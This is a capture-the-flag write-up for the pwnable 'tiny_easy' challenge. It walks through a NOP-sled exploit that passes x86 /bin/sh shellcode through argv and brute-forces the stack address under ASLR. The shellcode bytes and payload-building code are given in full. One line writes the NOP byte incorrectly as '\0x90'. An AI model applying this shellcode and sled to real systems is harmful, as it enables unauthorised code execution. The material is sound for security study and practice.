# Tiny Easy

```
I made a pretty difficult pwn task.
However I also made a dumb rookie mistake and made it too easy :(
This is based on real event :) enjoy.
```

```
tiny_easy@pwnable:~$ ls
flag  tiny_easy
tiny_easy@pwnable:~$ ./tiny_easy
Segmentation fault (core dumped)
```

When running the code, we get coredump right at the beginning (yay).


## Binary Information

```
$ file tiny_easy
tiny_easy: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), statically linked, no section header

$ checksec tiny_easy
[*] '/ctfs/pwnable/tiny_easy/tiny_easy'
    Arch:     i386-32-little
    RELRO:    No RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x8048000)
```

## What does the binary do

Well, not much:

```
void entry(code **param_1)

{
  (**param_1)();
                    /* WARNING: Bad instruction - Truncating control flow here */
  halt_baddata();
}

```

## How to exploit

We could just get a insert a shellcode by argv.
All we need to do is pass the following payload:
`<shellcode_address><shellcode>`

and that's it.

By setting a breakpoint at `0x8048056` on the remote GDB we find:
argv address is: `0xfff14fc2`


Since ASLR is enabled, each time this address will be randomized.
so, in order to bypass it, we can just build our payload as follows:

```
<address><plenty_of_nops><shellcode>
```


This way, we increase the chance that the address will be at one of the nops.
Then it will just run until it reaches the shell code.


## Crafting the payload

First thing I did was compiling a shellcode from `utils/shellcodes`.


```bash
$ cd utils/shellcodes
$ ./compile_asm.py open_shell_no_nullbytes_x86_32.asm  -o shellcode
```

Then, with python, I encoded it so I can store it in a variable in C:

```python
In [2]: from pathlib import Path
   ...: 
   ...: 
   ...: def decode_as_escaped_string(buffer: bytes) -> str:
   ...:   result = ''
   ...:   for byte in buffer:
   ...:     result += '\\x{:02x}'.format(byte)
   ...: 
   ...:   return result
   ...: 
   ...: 
   ...: shellcode = decode_as_escaped_string(Path('shellcode').read_bytes())
   ...: print(shellcode)
\xeb\x0b\x5b\x53\x6a\x0b\x58\x31\xc9\x31\xd2\xcd\x80\xe8\xf0\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68\x00
```


Then I could build the complete payload:

```python
In [7]: from pwn import *

In [8]: shellcode = r'\xeb\x0b\x5b\x53\x6a\x0b\x58\x31\xc9\x31\xd2\xcd\x80\xe8\xf0\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68\x00'

In [9]: address = decode_as_escaped_string(p32(0xfff14fc2))

In [10]: nop = r'\0x90'

In [11]: payload = address + nop * 0x18000 + shellcode

In [12]: payload = address + nop * 0x10 + shellcode
```

Then I just used this payload from my C code which passes it as argv.
(see `run_with_payload.c`)


## Pwned
```
tiny_easy@pwnable:~$ while true; do /tmp/fu/call_binary ; done
Segmentation fault (core dumped)
Segmentation fault (core dumped)
Segmentation fault (core dumped)
...
Segmentation fault (core dumped)
$ ls
flag  tiny_easy
$ cat flag
What a tiny task :) good job!
```
